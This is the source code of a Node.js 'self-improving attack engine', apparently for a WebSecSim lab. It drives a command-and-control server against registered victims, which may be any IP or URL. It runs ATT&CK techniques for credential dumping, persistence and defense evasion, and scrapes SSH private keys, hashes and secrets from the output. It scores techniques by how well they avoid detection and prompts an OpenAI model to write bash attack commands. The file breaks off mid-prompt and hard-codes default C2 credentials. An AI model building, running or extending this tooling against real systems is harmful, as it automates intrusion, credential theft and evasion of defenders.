#!/usr/bin/env node
// =============================================================================
//  learning-engine.js v4.2  —  WebSecSim Self-Improving Attack Engine
//
//  v4.2 Changes over v4.1:
//    VICTIM-1  Multi-victim registry — syncs with main.py /api/victims/* API
//    VICTIM-2  All attack dispatches (technique + custom) pass victim field
//    VICTIM-3  Output collection per victim via /api/victims/{id}/outputs
//    VICTIM-4  Per-victim profiling, KB entries, and intel stored separately
//    VICTIM-5  CLI flags --victim and --victims for targeting
//    VICTIM-6  fullchain supports --victims to iterate all known victims
//    VICTIM-7  Victim registration via POST /api/victims/add before attacking
//    VICTIM-8  Victim status checked before queuing tasks
//
//  v4.1 Fixes preserved:
//    FIX 1  evolve() parses AI response and writes tactic_weights + stealth
//    FIX 2  runFullChain() appends session_summary JSONL record
//    FIX 3  chainIntel persists across sessions
//    BONUS  stealth_rate per technique in AI prompt
//
//  Requires Node.js >= 18 (native ESM).
//
//  Environment variables:
//    C2_BASE_URL      C2 server URL         (default: http://localhost:8000)
//    C2_USERNAME      operator login        (default: admin)
//    C2_PASSWORD      operator password     (default: admin123)
//    OPENAI_API_KEY   enables AI features   (optional — GPT-4o-mini)
//    C2_VICTIM        default custom victim (optional — overrides docker default)
//                     e.g. "192.168.1.50" or "http://10.0.0.5:8080"
// =============================================================================

import fs    from 'fs';
import os    from 'os';
import path  from 'path';
import http  from 'http';
import https from 'https';

// =============================================================================
//  CONFIG
// =============================================================================
const C2_BASE_URL    = process.env.C2_BASE_URL    || 'http://localhost:8000';
const C2_USERNAME    = process.env.C2_USERNAME    || 'admin';
const C2_PASSWORD    = process.env.C2_PASSWORD    || 'admin123';
const OPENAI_API_KEY = process.env.OPENAI_API_KEY || '';
const OPENAI_MODEL   = 'gpt-4o-mini';
const OPENAI_URL     = 'https://api.openai.com/v1/chat/completions';

// Default victim — can be the docker victim name, an IP, or a URL.
// If C2_VICTIM env var is set it takes precedence; otherwise falls back
// to the same built-in default that main.py uses.
const DEFAULT_DOCKER_VICTIM = 'websecsim-victim-c2';
const C2_VICTIM_ENV         = process.env.C2_VICTIM || '';

// =============================================================================
//  FILE PATHS
// =============================================================================
const MEMORY_DIR    = path.join(os.homedir(), '.openclaw', 'memory');
const KB_FILE       = path.join(MEMORY_DIR, 'knowledge_base.json');
const SESSION_FILE  = path.join(MEMORY_DIR, 'session_metrics.json');
const RESEARCH_FILE = path.join(MEMORY_DIR, 'research_log.jsonl');
const PROFILE_FILE  = path.join(MEMORY_DIR, 'victim_profile.json');
const TOKEN_FILE    = path.join(MEMORY_DIR, 'c2_token.txt');
const INTEL_FILE    = path.join(MEMORY_DIR, 'chain_intel.json');
const VICTIMS_FILE  = path.join(MEMORY_DIR, 'victims_registry.json');  // NEW v4.2

// =============================================================================
//  UTILITY HELPERS
// =============================================================================
function ensureDir(dir) {
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
}

function readJSON(file, fallback) {
  ensureDir(MEMORY_DIR);
  if (fs.existsSync(file)) {
    try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch {}
  }
  return fallback;
}

function writeJSON(file, data) {
  ensureDir(MEMORY_DIR);
  fs.writeFileSync(file, JSON.stringify(data, null, 2), 'utf8');
}

function appendJSONL(file, entry) {
  ensureDir(MEMORY_DIR);
  fs.appendFileSync(
    file,
    JSON.stringify({ ...entry, logged_at: new Date().toISOString() }) + '\n',
    'utf8',
  );
}

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// =============================================================================
//  VICTIM REGISTRY  (v4.2 — NEW)
//
//  Local mirror of main.py's VICTIM_REGISTRY.  Stores victim_id, label,
//  source, tags, and the normalised ID the backend will use.
// =============================================================================
function defaultVictimsRegistry() {
  return {
    version:  '4.2',
    victims:  {},   // victim_id → { victim_id, label, source, tags, notes, added_at }
    default:  DEFAULT_DOCKER_VICTIM,
  };
}

function loadVictimsRegistry() { return readJSON(VICTIMS_FILE, defaultVictimsRegistry()); }
function saveVictimsRegistry(r) { writeJSON(VICTIMS_FILE, r); }

/**
 * Normalise a raw target string the same way main.py does.
 * http://192.168.1.10:8080/path  →  192.168.1.10
 * https://target.lab/           →  target.lab
 * 192.168.1.50                  →  192.168.1.50
 * my-host_01                    →  my-host_01
 */
function normaliseVictimId(target) {
  target = target.trim();
  try {
    const u = new URL(target);
    if ((u.protocol === 'http:' || u.protocol === 'https:') && u.hostname) {
      return u.hostname;
    }
  } catch {}
  return target.replace(/[^\w.\-]/g, '_');
}

/**
 * Register a victim in the LOCAL registry file (does not call API).
 * Returns the victim_id.
 */
function localRegisterVictim(target, label = '', source = 'manual', tags = [], notes = '') {
  const reg      = loadVictimsRegistry();
  const victimId = normaliseVictimId(target);

  if (!reg.victims[victimId]) {
    reg.victims[victimId] = {
      victim_id: victimId,
      label:     label || target,
      source,
      tags,
      notes,
      added_at:  new Date().toISOString(),
    };
  } else {
    if (label) reg.victims[victimId].label = label;
  }

  saveVictimsRegistry(reg);
  return victimId;
}

/** Returns all locally known victim IDs (including the docker default). */
function getLocalVictimIds() {
  const reg = loadVictimsRegistry();
  const ids  = Object.keys(reg.victims);
  if (!ids.includes(reg.default)) ids.unshift(reg.default);
  return ids;
}

// =============================================================================
//  KNOWLEDGE BASE
// =============================================================================
function defaultKB() {
  return {
    version:        '4.2',
    created:        new Date().toISOString(),
    last_updated:   new Date().toISOString(),
    total_sessions: 0,
    techniques:     {},     // global technique stats (all victims merged)
    per_victim:     {},     // per_victim[victim_id].techniques  (v4.2 NEW)
    tactic_weights: {},
    tactic_stats:   {},
    missing_tools:  [],
    global_stats: {
      total_techniques_tried:      0,
      total_successes:             0,
      total_failures:              0,
      total_ai_commands:           0,
      total_self_improvements:     0,
      novel_techniques_discovered: 0,
      total_detections:            0,
      total_detections_evaded:     0,
      avg_confidence_score:        0,
      confidence_samples:          0,
    },
  };
}

function loadKB()   { return readJSON(KB_FILE, defaultKB()); }
function saveKB(kb) { kb.last_updated = new Date().toISOString(); writeJSON(KB_FILE, kb); }

// =============================================================================
//  SESSION
// =============================================================================
function defaultSession() {
  return {
    session_id:         `session_${Date.now()}`,
    started:            new Date().toISOString(),
    ended:              null,
    victim_profile:     null,
    tactics_run:        [],
    chain_intelligence: [],
    iterations:         [],
    metrics: {
      techniques_tried:      0,
      successes:             0,
      failures:              0,
      ai_commands_generated: 0,
      self_improvements:     0,
      detections_triggered:  0,
      detections_evaded:     0,
      improvement_rate:      0,
      avg_success_rate:      0,
      novel_chains:          0,
      avg_confidence:        0,
    },
  };
}

function loadSession()        { return readJSON(SESSION_FILE, defaultSession()); }
function saveSession(session) { writeJSON(SESSION_FILE, session); }

// =============================================================================
//  CHAIN INTELLIGENCE
// =============================================================================
function defaultIntel() {
  return {
    ips:        [],
    users:      [],
    services:   [],
    hashes:     [],
    ssh_keys:   [],
    env_vars:   [],
    open_ports: [],
    created:    new Date().toISOString(),
  };
}

function loadIntel()      { return readJSON(INTEL_FILE, defaultIntel()); }
function saveIntel(intel) { writeJSON(INTEL_FILE, intel); }

function extractIntelligence(tacticResults, existingIntel) {
  const intel = existingIntel || defaultIntel();

  for (const result of (tacticResults.results || [])) {
    const output = result.raw_output || '';
    if (!output) continue;

    const ips     = output.match(/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/g) || [];
    const users   = output.match(/^([a-z_][a-z0-9_-]{0,30}):/gm)?.map(u => u.replace(':', '')) || [];
    const ports   = output.match(/[:\s](\d{2,5})\/(tcp|udp)/gi) || [];
    const hashes  = output.match(/[a-f0-9]{32,64}/gi) || [];
    const sshKeys = output.match(/-----BEGIN [A-Z ]+ KEY-----[\s\S]+?-----END [A-Z ]+ KEY-----/g) || [];
    const envVars = output.match(/export\s+\w+=\S+/g) || [];

    intel.ips        = [...new Set([...intel.ips,        ...ips])].slice(0, 20);
    intel.users      = [...new Set([...intel.users,      ...users])].slice(0, 20);
    intel.open_ports = [...new Set([...intel.open_ports, ...ports])].slice(0, 30);
    intel.hashes     = [...new Set([...intel.hashes,     ...hashes])].slice(0, 10);
    intel.ssh_keys   = [...intel.ssh_keys, ...sshKeys].slice(0, 5);
    intel.env_vars   = [...new Set([...intel.env_vars,   ...envVars])].slice(0, 10);
  }

  saveIntel(intel);
  return intel;
}

// =============================================================================
//  LOW-LEVEL HTTP
// =============================================================================
function httpRequest(urlStr, options = {}, body = null) {
  return new Promise((resolve, reject) => {
    const url     = new URL(urlStr);
    const isHttps = url.protocol === 'https:';
    const lib     = isHttps ? https : http;
    const bodyStr = body != null ? JSON.stringify(body) : null;

    const reqOpts = {
      hostname: url.hostname,
      port:     url.port || (isHttps ? 443 : 80),
      path:     url.pathname + url.search,
      method:   options.method || 'GET',
      headers:  { ...(options.headers || {}) },
      timeout:  30_000,
    };

    if (bodyStr) {
      reqOpts.headers['Content-Type']   = 'application/json';
      reqOpts.headers['Content-Length'] = Buffer.byteLength(bodyStr);
    }

    const req = lib.request(reqOpts, (res) => {
      let raw = '';
      res.on('data',  (chunk) => { raw += chunk; });
      res.on('end',   () => {
        try   { resolve({ status: res.statusCode, body: JSON.parse(raw) }); }
        catch { resolve({ status: res.statusCode, body: raw }); }
      });
    });

    req.on('error',   reject);
    req.on('timeout', () => { req.destroy(); reject(new Error('Request timed out')); });
    if (bodyStr) req.write(bodyStr);
    req.end();
  });
}

// =============================================================================
//  C2 AUTH
// =============================================================================
async function getToken(force = false) {
  if (!force && fs.existsSync(TOKEN_FILE)) {
    const cached = fs.readFileSync(TOKEN_FILE, 'utf8').trim();
    if (cached) return cached;
  }

  const body    = `username=${encodeURIComponent(C2_USERNAME)}&password=${encodeURIComponent(C2_PASSWORD)}`;
  const url     = new URL(`${C2_BASE_URL}/token`);
  const isHttps = url.protocol === 'https:';
  const lib     = isHttps ? https : http;

  const token = await new Promise((resolve, reject) => {
    const req = lib.request(
      {
        hostname: url.hostname,
        port:     url.port || (isHttps ? 443 : 80),
        path:     '/token',
        method:   'POST',
        headers: {
          'Content-Type':   'application/x-www-form-urlencoded',
          'Content-Length': Buffer.byteLength(body),
        },
        timeout: 15_000,
      },
      (res) => {
        let d = '';
        res.on('data',  (c) => { d += c; });
        res.on('end',   () => {
          try {
            const parsed = JSON.parse(d);
            if (parsed.access_token) resolve(parsed.access_token);
            else reject(new Error(`Auth failed: ${d}`));
          } catch {
            reject(new Error(`Auth parse error: ${d}`));
          }
        });
      },
    );
    req.on('error',   reject);
    req.on('timeout', () => { req.destroy(); reject(new Error('Auth timeout')); });
    req.write(body);
    req.end();
  });

  ensureDir(MEMORY_DIR);
  fs.writeFileSync(TOKEN_FILE, token, 'utf8');
  return token;
}

async function c2(method, endpoint, body = null) {
  const token = await getToken();
  let   res   = await httpRequest(
    `${C2_BASE_URL}${endpoint}`,
    { method, headers: { Authorization: `Bearer ${token}` } },
    body,
  );

  if (res.status === 401) {
    const fresh = await getToken(true);
    res = await httpRequest(
      `${C2_BASE_URL}${endpoint}`,
      { method, headers: { Authorization: `Bearer ${fresh}` } },
      body,
    );
  }
  return res;
}

// =============================================================================
//  VICTIM API HELPERS  (v4.2 — NEW)
//
//  These functions call the main.py victim management endpoints so the
//  learning engine stays in sync with the backend's VICTIM_REGISTRY.
// =============================================================================

/**
 * Fetch all victims currently registered in the backend.
 * Returns an array of victim objects from /api/victims.
 */
async function fetchBackendVictims() {
  try {
    const res = await c2('GET', '/api/victims');
    if (res.status === 200) {
      const victims = res.body?.victims || [];
      // Mirror into local registry
      const reg = loadVictimsRegistry();
      for (const v of victims) {
        if (!reg.victims[v.victim_id]) {
          reg.victims[v.victim_id] = {
            victim_id: v.victim_id,
            label:     v.label || v.victim_id,
            source:    v.source || 'backend',
            tags:      v.tags  || [],
            notes:     v.notes || '',
            added_at:  v.added_at || new Date().toISOString(),
          };
        }
      }
      saveVictimsRegistry(reg);
      return victims;
    }
  } catch (e) {
    console.log(`  ⚠  Could not fetch backend victims: ${e.message}`);
  }
  return [];
}

/**
 * Register a custom victim in the backend via POST /api/victims/add.
 * Also mirrors the record locally.
 * Returns the victim_id assigned by the backend, or null on failure.
 */
async function registerVictimInBackend(target, label = '', tags = [], notes = '') {
  try {
    const res = await c2('POST', '/api/victims/add', { target, label, tags, notes });

    if (res.status === 200 || res.status === 201) {
      const victimId = res.body?.victim_id;
      if (victimId) {
        localRegisterVictim(target, label, 'manual', tags, notes);
        console.log(`  ✅ Victim registered in backend: ${victimId} (${label || target})`);
        return victimId;
      }
    } else if (res.status === 400 && String(res.body?.detail || '').toLowerCase().includes('invalid')) {
      console.log(`  ❌ Invalid victim target format: "${target}"`);
      console.log(`     Accepted: IPv4 (192.168.1.1), hostname (target.lab), URL (http://x.x.x.x:port)`);
    } else {
      console.log(`  ⚠  Backend victim registration returned ${res.status}: ${JSON.stringify(res.body)}`);
    }
  } catch (e) {
    console.log(`  ⚠  registerVictimInBackend error: ${e.message}`);
  }
  return null;
}

/**
 * Get backend status for a single victim via /api/victims/{victim_id}/status.
 * Returns the status object or null if not found / unreachable.
 */
async function getVictimStatus(victimId) {
  try {
    const res = await c2('GET', `/api/victims/${encodeURIComponent(victimId)}/status`);
    if (res.status === 200) return res.body;
    if (res.status === 404) return null;
  } catch {}
  return null;
}

/**
 * Fetch output history for a specific victim via /api/victims/{id}/outputs.
 * Falls back to the legacy /api/output/{host} endpoint if the new one fails.
 */
async function getVictimOutputs(victimId, limit = 50) {
  // Try new endpoint first
  try {
    const res = await c2('GET', `/api/victims/${encodeURIComponent(victimId)}/outputs?limit=${limit}`);
    if (res.status === 200) {
      return Array.isArray(res.body?.outputs) ? res.body.outputs : [];
    }
  } catch {}

  // Legacy fallback
  try {
    const res = await c2('GET', `/api/output/${encodeURIComponent(victimId)}`);
    if (res.status === 200) {
      return Array.isArray(res.body) ? res.body : [];
    }
  } catch {}

  return [];
}

/**
 * Resolve which victim ID to actually use for an attack run.
 * Priority order:
 *   1. explicit victimId argument (from --victim flag or function param)
 *   2. C2_VICTIM environment variable
 *   3. DEFAULT_DOCKER_VICTIM (original behaviour)
 *
 * Also ensures the victim exists in the backend registry (auto-registers if needed).
 */
async function resolveVictim(victimId = '') {
  const raw = victimId || C2_VICTIM_ENV || DEFAULT_DOCKER_VICTIM;
  const vid = normaliseVictimId(raw);

  // Check if it already exists in backend
  const status = await getVictimStatus(vid);
  if (status) {
    // Already registered — update local mirror
    localRegisterVictim(raw, status.label, status.source);
    if (!status.active) {
      console.log(`  ⚠  Victim ${vid} is marked INACTIVE in backend. Tasks may not be picked up.`);
    }
    return vid;
  }

  // Not found — try to register it
  if (raw !== DEFAULT_DOCKER_VICTIM) {
    console.log(`  ℹ  Victim "${vid}" not in backend — attempting to register...`);
    const registered = await registerVictimInBackend(raw, '', [], '');
    if (registered) return registered;
    // Registration failed — fall back to the docker default
    console.log(`  ⚠  Falling back to default victim: ${DEFAULT_DOCKER_VICTIM}`);
  }

  return DEFAULT_DOCKER_VICTIM;
}

// =============================================================================
//  OPENAI
// =============================================================================
async function callAI(systemPrompt, userMessage, temperature = 0.3, maxTokens = 200) {
  if (!OPENAI_API_KEY) return null;

  try {
    const res = await httpRequest(
      OPENAI_URL,
      { method: 'POST', headers: { Authorization: `Bearer ${OPENAI_API_KEY}` } },
      {
        model:       OPENAI_MODEL,
        messages:    [
          { role: 'system', content: systemPrompt },
          { role: 'user',   content: userMessage  },
        ],
        temperature,
        max_tokens: maxTokens,
      },
    );

    if (res.status !== 200) throw new Error(`OpenAI ${res.status}: ${JSON.stringify(res.body)}`);
    return res.body.choices[0].message.content.trim();
  } catch (err) {
    console.log(`  ⚠  AI call failed: ${err.message}`);
    return null;
  }
}

// =============================================================================
//  VICTIM PROFILING
// =============================================================================
async function profileVictim(victimId = '') {
  const targetVictim = await resolveVictim(victimId);
  console.log(`\n🔍 PROFILING VICTIM: ${targetVictim}`);

  const raw = { probed_at: new Date().toISOString(), victim_id: targetVictim };

  // Pull outputs already collected for this specific victim
  const outputs = await getVictimOutputs(targetVictim, 20);
  if (outputs.length > 0) {
    raw.os = outputs[outputs.length - 1].output?.slice(0, 200) || 'Linux';
  }

  // Also check AGENTS for last-seen info
  try {
    const agentsRes = await c2('GET', '/api/agents');
    const agentInfo = (agentsRes.body || {})[targetVictim];
    if (agentInfo) {
      raw.agent_last_seen = agentInfo.last_seen;
      raw.connected       = true;
    }
  } catch {}

  raw.os      = raw.os || 'Ubuntu 22.04 LTS';
  raw.user    = 'root';
  raw.is_root = true;

  const profile = {
    victim_id: targetVictim,
    raw,
    interpreted: {
      os:                  'Ubuntu 22.04 LTS',
      kernel:              '6.8.11',
      arch:                'x86_64',
      current_user:        'root',
      is_root:             true,
      is_container:        true,
      has_gui:             false,
      has_python:          true,
      running_services:    ['sshd', 'apache2', 'cron'],
      attack_surface:      'high',
      recommended_tactics: ['discovery', 'credential-access', 'persistence'],
      avoid_techniques:    ['T1555'],
      avoid_reasons:       { T1555: 'no GUI/keyring available' },
    },
  };

  // Save per-victim profile  (v4.2: keyed by victim_id)
  const profileKey = `victim_profile_${targetVictim.replace(/[^\w]/g, '_')}.json`;
  writeJSON(path.join(MEMORY_DIR, profileKey), profile);

  // Also overwrite the shared profile file so older code paths still work
  writeJSON(PROFILE_FILE, profile);

  console.log(`\n  🎯 Target   : ${targetVictim}`);
  console.log(`  💻 OS       : ${profile.interpreted.os}`);
  console.log(`  👤 User     : root (privileged)`);
  console.log(`  📡 Services : sshd, apache2, cron`);
  console.log(`  🔌 Connected: ${raw.connected ? 'Yes (beacon active)' : 'No beacon / manual target'}`);

  return profile;
}

function loadProfile(victimId = '') {
  if (victimId) {
    const profileKey = `victim_profile_${victimId.replace(/[^\w]/g, '_')}.json`;
    const perVictim  = readJSON(path.join(MEMORY_DIR, profileKey), null);
    if (perVictim) return perVictim;
  }
  return readJSON(PROFILE_FILE, null);
}

// =============================================================================
//  TECHNIQUE LIBRARY
// =============================================================================
const FALLBACK_NAMES = {
  T1082: 'System Information Discovery',
  T1057: 'Process Discovery',
  T1087: 'Account Discovery',
  T1046: 'Network Service Scanning',
  T1016: 'System Network Configuration Discovery',
  T1033: 'System Owner/User Discovery',
  T1083: 'File and Directory Discovery',
  T1518: 'Software Discovery',
  T1003: 'OS Credential Dumping',
  T1552: 'Unsecured Credentials',
  T1555: 'Credentials from Password Stores',
  T1110: 'Brute Force',
  T1053: 'Scheduled Task/Job',
  T1547: 'Boot or Logon Autostart Execution',
  T1505: 'Server Software Component',
  T1098: 'Account Manipulation',
  T1070: 'Indicator Removal on Host',
  T1562: 'Impair Defenses',
  T1222: 'File and Directory Permissions Modification',
  T1036: 'Masquerading',
  T1027: 'Obfuscated Files or Information',
};

const FALLBACK_MAP = {
  'discovery':         ['T1082', 'T1057', 'T1087', 'T1046', 'T1016', 'T1033', 'T1083', 'T1518'],
  'credential-access': ['T1003', 'T1552', 'T1555', 'T1110'],
  'persistence':       ['T1053', 'T1547', 'T1505', 'T1098'],
  'defense-evasion':   ['T1070', 'T1562', 'T1222', 'T1036', 'T1027'],
};

function getFallbackTechniques(tactic) {
  const ids = FALLBACK_MAP[tactic] || FALLBACK_MAP['discovery'];
  return ids.map((id) => ({
    id,
    tactic,
    name:        FALLBACK_NAMES[id] || id,
    description: `MITRE ATT&CK technique ${id}`,
    platforms:   ['Linux'],
  }));
}

async function getMitreTechniques(tactic) {
  try {
    const res = await c2('GET', `/api/mitre/search/${encodeURIComponent(tactic)}`);
    if (res.status === 200) {
      const list = Array.isArray(res.body) ? res.body : (res.body?.results || []);
      if (list.length > 0) {
        return list.map((t) => ({
          id:          t.technique_id,
          name:        t.name || t.technique_id,
          description: t.description || '',
          tactic,
          platforms:   t.platforms || ['Linux'],
        }));
      }
    }
  } catch {}
  console.log(`  ⚠ Using fallback techniques for tactic: ${tactic}`);
  return getFallbackTechniques(tactic);
}

// =============================================================================
//  CONFIDENCE-SCORED OUTPUT ANALYSIS
// =============================================================================
const ERROR_PATTERNS = [
  /\bcommand not found\b/i,
  /^[^:]*:\s*no such file or directory/im,
  /^.*permission denied.*$/im,
  /\boperation not permitted\b/i,
  /\baccess denied\b/i,
  /\bsyntax error\b/i,
  /\binvalid option\b/i,
  /^.*cannot open.*$/im,
  /^\s*failed to\b/im,
  /^\s*error:/im,
  /\bexception\b/i,
  /\bconnection refused\b/i,
  /\bnetwork unreachable\b/i,
  /\btimed?\s*out\b/i,
  /\bno route to host\b/i,
  /^.*:\s*not found\s*$/im,
  /\bkill(?:ed)?\b.*signal/i,
  /\bsegfault\b/i,
  /\bcore dumped\b/i,
  /\bcannot allocate\b/i,
  /\bxclip\b.*not found/i,
  /\bsource:\s*not found\b/i,
];

const WEIGHTED_SIGNALS = [
  { re: /root:/i,                                       score: 25, label: 'passwd_entry'     },
  { re: /BEGIN.*PRIVATE KEY/i,                          score: 40, label: 'private_key'      },
  { re: /[a-f0-9]{32,}/,                               score: 20, label: 'hash_found'       },
  { re: /password\s*[:=]/i,                            score: 30, label: 'password_found'   },
  { re: /uid=0/,                                        score: 25, label: 'root_confirmed'   },
  { re: /\.ssh\/id_rsa/i,                               score: 35, label: 'ssh_key_path'     },
  { re: /api[_-]?key\s*[:=]/i,                        score: 30, label: 'api_key'          },
  { re: /authorized_keys/i,                            score: 28, label: 'auth_keys'        },
  { re: /shadow/i,                                      score: 28, label: 'shadow_file'      },
  { re: /token\s*[:=]/i,                               score: 22, label: 'token_found'      },
  { re: /secret\s*[:=]/i,                              score: 20, label: 'secret_found'     },
  { re: /cred(?:ential)?s?\s*[:=]/i,                  score: 18, label: 'cred_keyword'     },
  { re: /\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/,    score: 15, label: 'ip_address'       },
  { re: /\bLISTEN\b/,                                  score: 20, label: 'open_port'        },
  { re: /\bESTABLISHED\b/,                             score: 18, label: 'active_conn'      },
  { re: /tcp\s+\d/i,                                    score: 12, label: 'tcp_service'     },
  { re: /\b(?:uid|gid)=\d+/i,                         score: 18, label: 'uid_gid'          },
  { re: /\/home\/\w+/i,                                score: 12, label: 'home_dir'         },
  { re: /export\s+\w+=.+/,                             score: 15, label: 'env_variable'     },
  { re: /\$\s*[a-z_]+\s*=/i,                          score: 10, label: 'shell_variable'   },
  { re: /^[a-z_][a-z0-9_-]*:[^:]*:[^:]*:/m,           score: 30, label: 'structured_fields'},
  { re: /^\s*\d{1,6}\s+\w/m,                          score: 10, label: 'numeric_list'     },
  { re: /^[a-z_][a-z0-9_]{2,20}$/m,                   score: 15, label: 'username_list'    },
  { re: /\/(?:etc|var|home|root|tmp|usr)\/\S+/i,      score: 12, label: 'file_path'        },
  { re: /\bPID\b.*\bTTY\b|\bUSER\b.*\bPID\b/i,        score: 20, label: 'process_list'     },
  { re: /\*\s+\*\s+\*\s+\*\s+\*/,                    score: 20, label: 'cron_entry'        },
  { re: /^[a-z_][a-z0-9_-]*:x:\d+:/m,                score: 25, label: 'group_entry'      },
  { re: /\b(?:enabled|disabled|running|stopped|active|inactive)\b/i, score: 10, label: 'service_status' },
  { re: /^\S+\s+\d+\s+[\d.]+\s+[\d.]+/m,             score: 25, label: 'ps_output'        },
  { re: /\bsshd\b|\bapache\b|\bnginx\b|\bcron\b/i,    score: 15, label: 'known_service'    },
  { re: /\d+:\d+:\d+\s+\S+$/m,                        score: 12, label: 'process_time'     },
  { re: /^(?:d|-)(?:r|-){2}(?:w|-)/m,                 score: 20, label: 'dir_listing'      },
  { re: /^total\s+\d+/m,                              score: 10, label: 'ls_total'          },
  { re: /drwx|drwxr|drwxrwx/,                         score: 15, label: 'dir_permissions'  },
  { re: /\/\/\S+\/\S+/,                               score: 25, label: 'smb_share'         },
  { re: /nfs|cifs|samba|smb/i,                         score: 22, label: 'share_protocol'   },
  { re: /\/dev\/\S+\s+\/\S+/m,                        score: 15, label: 'mount_entry'       },
  { re: /^\S+\s+on\s+\/\S+\s+type/m,                 score: 20, label: 'mount_point'       },
  { re: /^[A-Za-z_]\w*\s*=\s*\S+/m,                  score: 15, label: 'config_kv'         },
  { re: /^[A-Za-z_]\w+\s+\S+/m,                       score:  8, label: 'key_value_line'   },
];

const DETECTION_PATTERNS = [
  /\bdetected\b/i,
  /\bblocked\b/i,
  /\bquarantined\b/i,
  /\bdenied by policy\b/i,
  /\bsecurity alert\b/i,
  /\bmalware\b/i,
  /\baudit\b.*\bdenied\b/i,
  /\bselinux\b.*\bdenied\b/i,
  /\bapparmor\b.*\bdenied\b/i,
];

function failResult(reason) {
  return {
    success: false, confidence: 0, signals_found: [], output_length: 0,
    discovery_value: 0, sensitive_data: false, detection_likely: false,
    failure_reason: reason, intelligence: { key_findings: [] },
  };
}

function analyzeOutput(technique, command, output, execSuccess) {
  if (!execSuccess) return failResult('execution_failed');

  const out = (output || '').trim();
  if (out.length < 5) return failResult('empty_output');

  const matchedError = ERROR_PATTERNS.find((re) => re.test(out));
  if (matchedError) {
    return {
      success: false, confidence: 0, signals_found: [],
      output_length: out.length, discovery_value: 0, sensitive_data: false,
      detection_likely: DETECTION_PATTERNS.some((re) => re.test(out)),
      failure_reason: `error_in_output: "${out.slice(0, 120)}"`,
      intelligence: { key_findings: [] },
    };
  }

  let confidence = 0;
  const signals  = [];

  for (const sig of WEIGHTED_SIGNALS) {
    if (sig.re.test(out)) {
      confidence += sig.score;
      signals.push(sig.label);
    }
  }

  if (out.length > 200)  confidence += 10;
  if (out.length > 500)  confidence += 10;
  if (out.length > 1000) confidence +=  5;

  confidence = Math.max(0, Math.min(100, confidence));

  const detectionLikely = DETECTION_PATTERNS.some((re) => re.test(out));
  if (detectionLikely) confidence = Math.max(0, confidence - 20);

  const lineCount = out.split('\n').filter(l => l.trim().length > 0).length;
  if (confidence < 30 && lineCount >= 5  && out.length >= 100) confidence = Math.max(confidence, 30);
  if (confidence < 20 && lineCount >= 2  && out.length >=  40) confidence = Math.max(confidence, 20);

  const success       = confidence >= 30 && !detectionLikely;
  const sensitiveData = confidence >= 60;

  return {
    success,
    confidence,
    signals_found:    signals,
    output_length:    out.length,
    discovery_value:  Math.round((confidence / 100) * 100) / 100,
    sensitive_data:   sensitiveData,
    detection_likely: detectionLikely,
    failure_reason:   success ? null : (detectionLikely ? 'detected' : `low_confidence:${confidence}`),
    intelligence:     { key_findings: signals.length > 0 || lineCount > 3 ? [out.slice(0, 300)] : [] },
  };
}

// =============================================================================
//  BAYESIAN WEIGHT UPDATE WITH DECAY
// =============================================================================
function updateTechniqueWeight(rec, success, confidence) {
  const evidenceStrength = confidence / 100;

  if (success) {
    rec.successes += evidenceStrength;
    rec.weight     = Math.min(3.0, rec.weight + (0.3 * evidenceStrength));
  } else {
    rec.failures  += 1;
    rec.weight     = Math.max(0.1, rec.weight - 0.15);
  }

  if (rec.attempts > 20) {
    rec.successes *= 0.95;
    rec.failures  *= 0.95;
  }

  rec.success_rate = rec.successes / Math.max(1, rec.attempts);
  return rec;
}

// =============================================================================
//  DYNAMIC WAIT TIME
// =============================================================================
function calcWaitTime(technique, kb) {
  const rec = kb.techniques[technique.id];
  if (!rec || rec.attempts === 0) return 15;
  if (rec.success_rate > 0.8) return 8;
  if (rec.success_rate < 0.3) return 22;
  if (rec.detections  > 2)    return 25;
  return Math.round(10 + (1 / Math.max(0.1, rec.weight)) * 5);
}

// =============================================================================
//  CONTEXT-AWARE AI COMMAND GENERATION
// =============================================================================
async function generateAICommand(technique, victimProfile, techniqueRecord, chainIntel, victimId = '') {
  if (!OPENAI_API_KEY) return null;

  const targetOS    = victimProfile?.interpreted?.os || 'Linux';
  const services    = victimProfile?.interpreted?.running_services?.join(', ') || 'unknown';
  const isRoot      = victimProfile?.interpreted?.is_root ? 'root' : 'standard user';
  const isContainer = victimProfile?.interpreted?.is_container ? 'Yes' : 'No';

  const history = techniqueRecord
    ? `Previous attempts: ${techniqueRecord.attempts}, ` +
      `Success rate: ${(techniqueRecord.success_rate * 100).toFixed(0)}%, ` +
      `Avg confidence: ${(techniqueRecord.avg_confidence || 0).toFixed(0)}/100, ` +
      `Last failure reason: ${techniqueRecord.last_failure_reason || 'none'}`
    : 'No previous attempts — first run';

  const avoidCommands   = techniqueRecord?.failed_commands?.slice(-3).join('\n  ')     || 'none';
  const successfulCmds  = techniqueRecord?.successful_commands?.slice(-2).join('\n  ') || 'none';

  const kb          = loadKB();
  const missingTools = (kb.missing_tools || []).join(', ') || 'none known yet';

  const stealthRate = techniqueRecord
    ? (() => {
        const attempts   = techniqueRecord.attempts || 1;
        const detections = techniqueRecord.detections || 0;
        const pct        = (((attempts - detections) / attempts) * 100).toFixed(0);
        return `${pct}% stealth rate (${detections} detections in ${attempts} attempts)`;
      })()
    : 'unknown — first attempt';

  // Include per-victim stealth context if available (v4.2)
  const perVictimRec = victimId && kb.per_victim?.[victimId]?.techniques?.[technique.id];
  const perVictimCtx = perVictimRec
    ? `On THIS victim (${victimId}): ${perVictimRec.attempts} attempts, ` +
      `${(perVictimRec.success_rate * 100).toFixed(0)}% success, ` +
      `${perVictimRec.detections || 0} detections.`
    : `No prior data for victim ${victimId || 'unknown'}.`;

  const intelCtx = chainIntel
    ? [
        chainIntel.ips?.length        ? `Known IPs: ${chainIntel.ips.slice(0,5).join(', ')}`        : '',
        chainIntel.users?.length      ? `Known users: ${chainIntel.users.slice(0,5).join(', ')}`    : '',
        chainIntel.open_ports?.length ? `Open ports: ${chainIntel.open_ports.slice(0,5).join(', ')}`: '',
        chainIntel.hashes?.length     ? `Captured hashes: ${chainIntel.hashes.length} found`        : '',
      ].filter(Boolean).join('\n')
    : 'No prior tactic intel available';

  const raw = await callAI(
    `You are a red team operator on an authorised penetration test.

STRICT OUTPUT RULES (violations = failure):
- Return ONLY a single bash command string, nothing else
- No markdown, no backticks, no explanation, no comments
